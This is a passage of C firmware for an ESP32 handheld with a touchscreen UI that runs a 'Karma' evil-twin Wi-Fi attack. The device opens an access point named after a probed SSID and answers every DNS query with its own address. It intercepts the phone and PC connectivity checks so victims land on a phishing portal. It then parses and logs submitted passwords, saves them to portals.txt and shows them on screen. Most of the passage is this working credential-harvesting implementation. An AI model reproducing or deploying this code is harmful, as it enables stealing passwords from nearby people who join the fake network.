            if (i > 0) strcat(options, "\n");
            strcat(options, karma2_html_files[i]);
        }
        lv_dropdown_set_options(karma2_html_dropdown, options);
    } else {
        lv_dropdown_set_options(karma2_html_dropdown, "(Default portal)");
    }
    
    // Button row
    lv_obj_t *btn_row = lv_obj_create(karma2_html_popup_obj);
    lv_obj_set_size(btn_row, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_row, 20, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    
    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 100, 40);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x444444), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_add_event_cb(cancel_btn, karma2_html_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *cancel_label = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_label, "Cancel");
    lv_obj_center(cancel_label);
    
    // Start button
    lv_obj_t *start_btn = lv_btn_create(btn_row);
    lv_obj_set_size(start_btn, 130, 40);
    lv_obj_set_style_bg_color(start_btn, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_radius(start_btn, 8, 0);
    lv_obj_add_event_cb(start_btn, karma2_html_select_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *start_label = lv_label_create(start_btn);
    lv_label_set_text(start_label, "Start Portal");
    lv_obj_set_style_text_color(start_label, lv_color_hex(0x000000), 0);
    lv_obj_center(start_label);
}

// HTML popup close callback
static void karma2_html_popup_close_cb(lv_event_t *e)
{
    (void)e;
    if (karma2_html_popup_overlay) {
        lv_obj_del(karma2_html_popup_overlay);
        karma2_html_popup_overlay = NULL;
        karma2_html_popup_obj = NULL;
        karma2_html_dropdown = NULL;
    }
}

// HTML select callback - start captive portal
static void karma2_html_select_cb(lv_event_t *e)
{
    (void)e;
    
    if (!karma2_html_dropdown || karma2_selected_probe_idx < 0) return;
    
    // Load selected HTML file
    if (custom_portal_html) {
        free(custom_portal_html);
        custom_portal_html = NULL;
    }
    
    int html_idx = lv_dropdown_get_selected(karma2_html_dropdown);
    
    if (karma2_html_count > 0 && html_idx < karma2_html_count) {
        char filepath[128];
        snprintf(filepath, sizeof(filepath), "/sdcard/lab/htmls/%s", karma2_html_files[html_idx]);
        
        FILE *f = fopen(filepath, "r");
        if (f) {
            fseek(f, 0, SEEK_END);
            long size = ftell(f);
            fseek(f, 0, SEEK_SET);
            
            if (size > 0 && size < PORTAL_HTML_MAX_SIZE) {
                custom_portal_html = malloc(size + 1);
                if (custom_portal_html) {
                    fread(custom_portal_html, 1, size, f);
                    custom_portal_html[size] = '\0';
                    ESP_LOGI(TAG, "Loaded HTML file: %s (%ld bytes)", filepath, size);
                }
            }
            fclose(f);
        } else {
            ESP_LOGW(TAG, "Cannot open HTML file: %s", filepath);
        }
    }
    
    // Close HTML popup
    if (karma2_html_popup_overlay) {
        lv_obj_del(karma2_html_popup_overlay);
        karma2_html_popup_overlay = NULL;
        karma2_html_popup_obj = NULL;
        karma2_html_dropdown = NULL;
    }
    
    // Get selected SSID
    const char *ssid = karma2_probes[karma2_selected_probe_idx];
    
    ESP_LOGI(TAG, "Starting captive portal with SSID: %s", ssid);
    
    // Start captive portal
    esp_err_t ret = start_captive_portal(ssid);
    if (ret == ESP_OK) {
        show_karma2_attack_popup(ssid);
    } else {
        ESP_LOGE(TAG, "Failed to start captive portal");
    }
}

// Save portal data to file
static void save_portal_data(const char *ssid, const char *form_data)
{
    if (!ssid || !form_data) return;
    
    FILE *f = fopen("/sdcard/lab/portals.txt", "a");
    if (f) {
        fprintf(f, "SSID: %s\nData: %s\n---\n", ssid, form_data);
        fclose(f);
        ESP_LOGI(TAG, "Portal data saved for SSID: %s", ssid);
        
        // Increment new data counter and update portal icon
        portal_new_data_count++;
        update_portal_icon();
    } else {
        ESP_LOGW(TAG, "Cannot open portals.txt for writing");
    }
}

// ============================================================================
// HTTP Handlers for Captive Portal
// ============================================================================

// Root handler - returns portal HTML
static esp_err_t portal_root_handler(httpd_req_t *req)
{
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_set_type(req, "text/html; charset=utf-8");
    
    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Portal page handler
static esp_err_t portal_page_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Login handler - POST with password
static esp_err_t portal_login_handler(httpd_req_t *req)
{
    char buf[512];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        return ESP_FAIL;
    }
    buf[ret] = '\0';
    
    ESP_LOGI(TAG, "Portal received POST data: %s", buf);
    
    // Parse password
    char *password_start = strstr(buf, "password=");
    if (password_start) {
        password_start += 9;
        char *password_end = strchr(password_start, '&');
        if (password_end) *password_end = '\0';
        
        // URL decode
        char decoded[64];
        int decoded_len = 0;
        for (char *p = password_start; *p && decoded_len < (int)sizeof(decoded) - 1; p++) {
            if (*p == '%' && p[1] && p[2]) {
                char hex[3] = {p[1], p[2], '\0'};
                decoded[decoded_len++] = (char)strtol(hex, NULL, 16);
                p += 2;
            } else if (*p == '+') {
                decoded[decoded_len++] = ' ';
            } else {
                decoded[decoded_len++] = *p;
            }
        }
        decoded[decoded_len] = '\0';
        
        ESP_LOGI(TAG, "Password: %s", decoded);
        
        // Save to file
        save_portal_data(portal_ssid, buf);
        
        // Update UI if attack popup is visible
        if (karma2_attack_status_label) {
            bsp_display_lock(0);
            lv_label_set_text_fmt(karma2_attack_status_label, 
                "Portal: %s\n\nPassword received: %s\n\nData saved to portals.txt", 
                portal_ssid, decoded);
            lv_obj_set_style_text_color(karma2_attack_status_label, COLOR_MATERIAL_GREEN, 0);
            bsp_display_unlock();
        }
    }
    
    // Response
    const char *response = 
        "<!DOCTYPE html><html><head>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
        "<title>Connected</title>"
        "<style>"
        "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
        ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
        "h1 { text-align: center; color: #4CAF50; }"
        "p { text-align: center; color: #666; }"
        "</style>"
        "</head>"
        "<body>"
        "<div class='container'>"
        "<h1>Connected!</h1>"
        "<p>You are now connected to the network.</p>"
        "</div>"
        "</body></html>";
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// GET handler for password via query string
static esp_err_t portal_get_handler(httpd_req_t *req)
{
    size_t query_len = httpd_req_get_url_query_len(req);
    if (query_len > 0) {
        char *query = malloc(query_len + 1);
        if (query && httpd_req_get_url_query_str(req, query, query_len + 1) == ESP_OK) {
            ESP_LOGI(TAG, "Portal GET query: %s", query);
            
            char password[64];
            if (httpd_query_key_value(query, "password", password, sizeof(password)) == ESP_OK) {
                // URL decode
                char decoded[64];
                int decoded_len = 0;
                for (char *p = password; *p && decoded_len < (int)sizeof(decoded) - 1; p++) {
                    if (*p == '%' && p[1] && p[2]) {
                        char hex[3] = {p[1], p[2], '\0'};
                        decoded[decoded_len++] = (char)strtol(hex, NULL, 16);
                        p += 2;
                    } else if (*p == '+') {
                        decoded[decoded_len++] = ' ';
                    } else {
                        decoded[decoded_len++] = *p;
                    }
                }
                decoded[decoded_len] = '\0';
                
                ESP_LOGI(TAG, "Password: %s", decoded);
                save_portal_data(portal_ssid, query);
                
                // Update UI
                if (karma2_attack_status_label) {
                    bsp_display_lock(0);
                    lv_label_set_text_fmt(karma2_attack_status_label, 
                        "Portal: %s\n\nPassword received: %s\n\nData saved to portals.txt", 
                        portal_ssid, decoded);
                    lv_obj_set_style_text_color(karma2_attack_status_label, COLOR_MATERIAL_GREEN, 0);
                    bsp_display_unlock();
                }
            }
            free(query);
        }
    }
    
    // Response
    const char *response = 
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<title>Connected</title></head><body>"
        "<h1>Connected!</h1><p>You are now connected.</p>"
        "</body></html>";
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Save handler
static esp_err_t portal_save_handler(httpd_req_t *req)
{
    return portal_login_handler(req);
}

// Android captive portal detection
static esp_err_t android_captive_handler(httpd_req_t *req)
{
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Content-Type", "text/html");
    
    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// iOS captive portal detection
static esp_err_t ios_captive_handler(httpd_req_t *req)
{
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Content-Type", "text/html");
    
    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Generic captive detection handler
static esp_err_t captive_detection_handler(httpd_req_t *req)
{
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_type(req, "text/html");
    
    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Catch-all redirect handler
static esp_err_t captive_portal_redirect_handler(httpd_req_t *req)
{
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/portal");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

// ============================================================================
// DNS Server for Captive Portal
// ============================================================================

static void dns_server_task(void *pvParameters)
{
    (void)pvParameters;
    
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    
    // Allocate buffers from PSRAM - keep them for task lifetime (never freed)
    static char *rx_buffer = NULL;
    static char *tx_buffer = NULL;
    
    if (!rx_buffer) {
        rx_buffer = heap_caps_malloc(DNS_MAX_PACKET_SIZE, MALLOC_CAP_SPIRAM);
    }
    if (!tx_buffer) {
        tx_buffer = heap_caps_malloc(DNS_MAX_PACKET_SIZE, MALLOC_CAP_SPIRAM);
    }
    if (!rx_buffer || !tx_buffer) {
        ESP_LOGE(TAG, "DNS: Failed to allocate buffers from PSRAM");
        dns_server_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Outer loop - task never exits, just waits for portal_active
    while (1) {
        // Wait until portal becomes active
        while (!portal_active) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    
    // Create UDP socket
    dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (dns_server_socket < 0) {
        ESP_LOGE(TAG, "DNS: Failed to create socket");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
    }
    
    // Bind to port 53
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(53);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(dns_server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        ESP_LOGE(TAG, "DNS: Failed to bind socket");
        close(dns_server_socket);
        dns_server_socket = -1;
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
    }
    
    ESP_LOGI(TAG, "DNS server started on port 53");
    
    // Set socket timeout
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(dns_server_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
        // Inner loop - handle DNS requests while portal is active
    while (portal_active && dns_server_socket >= 0) {
            int len = recvfrom(dns_server_socket, rx_buffer, DNS_MAX_PACKET_SIZE, 0,
                          (struct sockaddr *)&client_addr, &client_addr_len);
        
            if (len < 0) {
                // Check if it's just a timeout (EAGAIN/EWOULDBLOCK) - ignore and continue
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    continue;
                }
                break;  // Real socket error
            }
            if (!portal_active || dns_server_socket < 0) break;  // Portal stopped
        if (len < 12) continue;  // Invalid DNS packet
        
        // Build DNS response - redirect all queries to 172.0.0.1
        memcpy(tx_buffer, rx_buffer, len);
        
        // Set response flags
        tx_buffer[2] = 0x81;  // QR=1 (response), Opcode=0, AA=1
        tx_buffer[3] = 0x80;  // RA=1
        
        // Set answer count = 1
        tx_buffer[6] = 0x00;
        tx_buffer[7] = 0x01;
        
        // Find end of question section
        int question_end = 12;
        while (question_end < len && rx_buffer[question_end] != 0) {
            question_end += rx_buffer[question_end] + 1;
        }
        question_end += 5;  // Skip null byte + QTYPE (2) + QCLASS (2)
        
        // Build answer section
        int answer_offset = question_end;
        
        // Name pointer to question
        tx_buffer[answer_offset++] = 0xC0;
        tx_buffer[answer_offset++] = 0x0C;
        
        // Type A
        tx_buffer[answer_offset++] = 0x00;
        tx_buffer[answer_offset++] = 0x01;
        
        // Class IN
        tx_buffer[answer_offset++] = 0x00;
        tx_buffer[answer_offset++] = 0x01;
        
        // TTL (60 seconds)
        tx_buffer[answer_offset++] = 0x00;
        tx_buffer[answer_offset++] = 0x00;
        tx_buffer[answer_offset++] = 0x00;
        tx_buffer[answer_offset++] = 0x3C;
        
        // Data length (4 bytes for IPv4)
        tx_buffer[answer_offset++] = 0x00;
        tx_buffer[answer_offset++] = 0x04;
        
        // IP address: 172.0.0.1
        tx_buffer[answer_offset++] = 172;
        tx_buffer[answer_offset++] = 0;
        tx_buffer[answer_offset++] = 0;
        tx_buffer[answer_offset++] = 1;
        
        sendto(dns_server_socket, tx_buffer, answer_offset, 0,
               (struct sockaddr *)&client_addr, client_addr_len);
    }
    
        // Close socket when portal stops
        if (dns_server_socket >= 0) {
            close(dns_server_socket);
            dns_server_socket = -1;
        }
    
    ESP_LOGI(TAG, "DNS server stopped");
        
        // Don't exit - go back to waiting for portal_active
        // This avoids pthread TLS cleanup issues with vTaskDelete
    }
}

// ============================================================================
// Start/Stop Captive Portal
// ============================================================================

static esp_err_t start_captive_portal(const char *ssid)
{
    if (portal_active) {
        ESP_LOGW(TAG, "Portal already active");
        return ESP_ERR_INVALID_STATE;
    }
    
    ESP_LOGI(TAG, "Starting captive portal with SSID: %s", ssid);
    
    // Track which tab (UART) started the portal
    portal_started_by_uart = uart_index_for_tab(current_tab);  // 1=Grove/USB, 2=MBus, 0=Internal
    
    // Ensure WiFi is initialized via ESP-Hosted
    if (!esp_modem_wifi_initialized) {
        ESP_LOGI(TAG, "Initializing WiFi via ESP-Hosted...");
        esp_err_t wifi_ret = esp_modem_wifi_init();
        if (wifi_ret != ESP_OK) {
            ESP_LOGE(TAG, "Failed to initialize WiFi: %s", esp_err_to_name(wifi_ret));
            return wifi_ret;
        }
    }
    
    // Store SSID
    if (portal_ssid) free(portal_ssid);
    portal_ssid = strdup(ssid);
    
    // Get existing AP netif or create new one (ESP-Hosted compatible)
    if (!ap_netif) {
        // First try to get existing AP netif
        ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (!ap_netif) {
            ESP_LOGI(TAG, "Creating new AP netif...");
            // Create AP netif manually without ESP_ERROR_CHECK
            esp_netif_inherent_config_t base_cfg = ESP_NETIF_INHERENT_DEFAULT_WIFI_AP();
            esp_netif_config_t cfg = {
                .base = &base_cfg,
                .driver = NULL,
                .stack = ESP_NETIF_NETSTACK_DEFAULT_WIFI_AP,
            };
            ap_netif = esp_netif_new(&cfg);
            if (!ap_netif) {
                ESP_LOGE(TAG, "Failed to create AP netif");
                return ESP_ERR_NO_MEM;
            }
            // Attach WiFi driver to netif
            esp_err_t attach_ret = esp_netif_attach_wifi_ap(ap_netif);
            if (attach_ret != ESP_OK) {
                ESP_LOGW(TAG, "Failed to attach WiFi AP driver: %s (may already be attached)", esp_err_to_name(attach_ret));
            }
            esp_wifi_set_default_wifi_ap_handlers();
        } else {
            ESP_LOGI(TAG, "Using existing AP netif");
        }
    }
    
    // Set WiFi mode to AP+STA (or just AP if no STA needed)
    esp_err_t ret = esp_wifi_set_mode(WIFI_MODE_APSTA);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set APSTA mode: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Stop DHCP server to configure (ignore error if not running)
    esp_netif_dhcps_stop(ap_netif);
    
    // Set static IP 172.0.0.1
    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    
    ret = esp_netif_set_ip_info(ap_netif, &ip_info);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set IP info: %s", esp_err_to_name(ret));
        return ret;
    }
    
    ESP_LOGI(TAG, "AP IP set to 172.0.0.1");
    
    // Configure AP
    wifi_config_t ap_config = {0};
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    memcpy(ap_config.ap.ssid, ssid, ssid_len);
    ap_config.ap.ssid_len = ssid_len;
    ap_config.ap.channel = 1;
    ap_config.ap.password[0] = '\0';
    ap_config.ap.max_connection = 4;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    
    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Start DHCP server
    ret = esp_netif_dhcps_start(ap_netif);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
        return ret;
    }
    
    vTaskDelay(pdMS_TO_TICKS(500));
    
    // Start HTTP server only if not already running (we never stop it to avoid TLS crash)
    if (portal_server == NULL) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_open_sockets = 7;
        config.max_uri_handlers = 12;  // We have 10 handlers, default is 8
    config.uri_match_fn = httpd_uri_match_wildcard;
        config.stack_size = 8192;      // Increase stack for larger requests
        config.recv_wait_timeout = 10; // Increase timeout for slow clients
    
    ret = httpd_start(&portal_server, &config);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start HTTP server: %s", esp_err_to_name(ret));
        return ret;
    }
    
    ESP_LOGI(TAG, "HTTP server started on port 80");
    
        // Register URI handlers (only once, handlers stay registered)
    httpd_uri_t root_uri = { .uri = "/", .method = HTTP_GET, .handler = portal_root_handler };
    httpd_register_uri_handler(portal_server, &root_uri);
    
    httpd_uri_t root_post_uri = { .uri = "/", .method = HTTP_POST, .handler = portal_root_handler };
    httpd_register_uri_handler(portal_server, &root_post_uri);
    
    httpd_uri_t portal_uri = { .uri = "/portal", .method = HTTP_GET, .handler = portal_page_handler };
    httpd_register_uri_handler(portal_server, &portal_uri);
    
    httpd_uri_t login_uri = { .uri = "/login", .method = HTTP_POST, .handler = portal_login_handler };
    httpd_register_uri_handler(portal_server, &login_uri);
    
    httpd_uri_t get_uri = { .uri = "/get", .method = HTTP_GET, .handler = portal_get_handler };
    httpd_register_uri_handler(portal_server, &get_uri);
    
    httpd_uri_t save_uri = { .uri = "/save", .method = HTTP_POST, .handler = portal_save_handler };
    httpd_register_uri_handler(portal_server, &save_uri);
    
    httpd_uri_t android_uri = { .uri = "/generate_204", .method = HTTP_GET, .handler = android_captive_handler };
    httpd_register_uri_handler(portal_server, &android_uri);
    
    httpd_uri_t ios_uri = { .uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = ios_captive_handler };
    httpd_register_uri_handler(portal_server, &ios_uri);
    
    httpd_uri_t ncsi_uri = { .uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_detection_handler };
    httpd_register_uri_handler(portal_server, &ncsi_uri);
    
    httpd_uri_t wildcard_uri = { .uri = "/*", .method = HTTP_GET, .handler = captive_portal_redirect_handler };
    httpd_register_uri_handler(portal_server, &wildcard_uri);
    } else {
        ESP_LOGI(TAG, "HTTP server already running, reusing");
    }
    
    // Mark portal as active
    portal_active = true;
    
    // Start DNS server - reuse existing task if available (task never exits)
    if (dns_server_task_handle == NULL) {
        xTaskCreate(dns_server_task, "dns_server", 8192, NULL, 5, &dns_server_task_handle);
    }
    // If task already exists, it will detect portal_active and start serving
    
    ESP_LOGI(TAG, "Captive portal started successfully!");
    ESP_LOGI(TAG, "Connect to '%s' WiFi to access the portal", ssid);
    
    return ESP_OK;
}

static void stop_captive_portal(void)
{
    ESP_LOGI(TAG, "Stopping captive portal...");
    
    // Signal task to stop
    portal_active = false;
    portal_started_by_uart = 0;  // Reset which UART started portal
    
    // Don't delete DNS server task - it has an outer loop and will wait for portal_active
    // Deleting tasks that use sockets causes pthread TLS cleanup issues on ESP32
    // Just close socket to unblock it - the task will stop and wait
    if (dns_server_socket >= 0) {
        int sock = dns_server_socket;
        dns_server_socket = -1;
        close(sock);
    }
    
    // Wait briefly for task to notice and stop
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // DON'T stop HTTP server - httpd_stop() deletes worker tasks which causes
    // pthread TLS cleanup crash on ESP32-P4 RISC-V. Just leave it running.
    // The handlers check portal_active and will return errors when portal is stopped.
    // Server will be reused when portal starts again.
    
    // Free portal SSID
    if (portal_ssid) {
        free(portal_ssid);
        portal_ssid = NULL;
    }
    
    // Free custom HTML
    if (custom_portal_html) {
        free(custom_portal_html);
        custom_portal_html = NULL;
    }
    
    // Switch back to STA mode
    esp_wifi_set_mode(WIFI_MODE_STA);
    
    ESP_LOGI(TAG, "Captive portal stopped");
}

// ============================================================================
// Karma Attack Popup
// ============================================================================

static void show_karma2_attack_popup(const char *ssid)
{
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    karma2_attack_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(karma2_attack_popup_overlay);
    lv_obj_set_size(karma2_attack_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(karma2_attack_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(karma2_attack_popup_overlay, LV_OPA_80, 0);
    lv_obj_clear_flag(karma2_attack_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    
    karma2_attack_popup_obj = lv_obj_create(karma2_attack_popup_overlay);
    lv_obj_set_size(karma2_attack_popup_obj, 400, LV_SIZE_CONTENT);
    lv_obj_center(karma2_attack_popup_obj);
    lv_obj_set_style_bg_color(karma2_attack_popup_obj, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_color(karma2_attack_popup_obj, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(karma2_attack_popup_obj, 2, 0);
    lv_obj_set_style_radius(karma2_attack_popup_obj, 12, 0);
    lv_obj_set_style_pad_all(karma2_attack_popup_obj, 25, 0);
    lv_obj_set_flex_flow(karma2_attack_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(karma2_attack_popup_obj, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(karma2_attack_popup_obj, 15, 0);
    lv_obj_clear_flag(karma2_attack_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(karma2_attack_popup_obj);
    lv_label_set_text(title, LV_SYMBOL_WIFI " Karma Attack Active");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // Status label
    karma2_attack_status_label = lv_label_create(karma2_attack_popup_obj);
    lv_label_set_text_fmt(karma2_attack_status_label, 
        "Portal: %s\n\nWaiting for clients...\n\nConnect to the WiFi network above", ssid);
    lv_obj_set_style_text_font(karma2_attack_status_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(karma2_attack_status_label, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_align(karma2_attack_status_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_width(karma2_attack_status_label, lv_pct(100));
    lv_label_set_long_mode(karma2_attack_status_label, LV_LABEL_LONG_WRAP);
    
    // Buttons container
    lv_obj_t *btn_cont = lv_obj_create(karma2_attack_popup_obj);
    lv_obj_remove_style_all(btn_cont);
    lv_obj_set_size(btn_cont, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(btn_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_cont, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_cont, 15, 0);
    lv_obj_clear_flag(btn_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    // Background button
    lv_obj_t *bg_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(bg_btn, 150, 50);
    lv_obj_set_style_bg_color(bg_btn, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_radius(bg_btn, 8, 0);
    lv_obj_add_event_cb(bg_btn, karma2_attack_background_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *bg_label = lv_label_create(bg_btn);
    lv_label_set_text(bg_label, LV_SYMBOL_EYE_CLOSE " Background");
    lv_obj_set_style_text_font(bg_label, &lv_font_montserrat_16, 0);
    lv_obj_center(bg_label);
    
    // Stop button
    lv_obj_t *stop_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(stop_btn, 150, 50);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_add_event_cb(stop_btn, karma2_attack_stop_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, LV_SYMBOL_CLOSE " Stop Portal");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_16, 0);
    lv_obj_center(stop_label);
}

static void karma2_attack_stop_cb(lv_event_t *e)
{
    (void)e;
    
    ESP_LOGI(TAG, "Stopping Karma attack...");
    
    // Reset background mode
    portal_background_mode = false;
    update_portal_icon();
    
    // Stop captive portal
    stop_captive_portal();
    
    // Close popup
    if (karma2_attack_popup_overlay) {
        lv_obj_del(karma2_attack_popup_overlay);
        karma2_attack_popup_overlay = NULL;
        karma2_attack_popup_obj = NULL;
        karma2_attack_status_label = NULL;
    }
}

static void karma2_attack_background_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Portal moved to background, switching to INTERNAL tab");
    
    portal_background_mode = true;
    portal_new_data_count = 0;
    
    // Remember which device started the portal (1=Grove/USB, 2=MBus)
    portal_started_by_uart = uart_index_for_tab(current_tab);
    ESP_LOGI(TAG, "Portal started by UART%d", portal_started_by_uart);
    
    // Close popup but keep portal running
    if (karma2_attack_popup_overlay) {
        lv_obj_del(karma2_attack_popup_overlay);
        karma2_attack_popup_overlay = NULL;
        karma2_attack_popup_obj = NULL;
        karma2_attack_status_label = NULL;
    }
    
    update_portal_icon();
    
    // Switch to INTERNAL tab and show Ad Hoc Portal page
    switch_to_adhoc_portal_page();
}

// Helper to programmatically switch to INTERNAL tab and show Ad Hoc Portal page
static void switch_to_adhoc_portal_page(void)
{
    ESP_LOGI(TAG, "Programmatically switching to INTERNAL tab (tab 2)");
    
    // Save current context before switching
    tab_context_t *old_ctx = get_current_ctx();
    save_globals_to_tab_context(old_ctx);
    
    // Hide current container
    lv_obj_t *old_container = get_container_for_tab(current_tab);
    if (old_container) {
        lv_obj_add_flag(old_container, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Switch to INTERNAL tab
    current_tab = TAB_INTERNAL;
    update_tab_styles();
    
    // Restore INTERNAL tab context
    tab_context_t *new_ctx = get_current_ctx();
    restore_tab_context_to_globals(new_ctx);
    restore_ui_pointers_from_ctx(new_ctx);
    
    // Show internal container
    if (internal_container) {
        lv_obj_clear_flag(internal_container, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Create internal tiles if not yet created
    if (!internal_ctx.tiles) {
        show_internal_tiles();
    }
    
    // Now show the Ad Hoc Portal page
    show_adhoc_portal_page();
}

//==================================================================================
// Ad Hoc Portal & Karma Page (INTERNAL tab)
//==================================================================================

static void adhoc_portal_back_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Ad Hoc Portal back button clicked");
    
    // Hide ad hoc portal page, show internal tiles
    if (adhoc_portal_page) {
        lv_obj_add_flag(adhoc_portal_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    if (internal_ctx.tiles) {
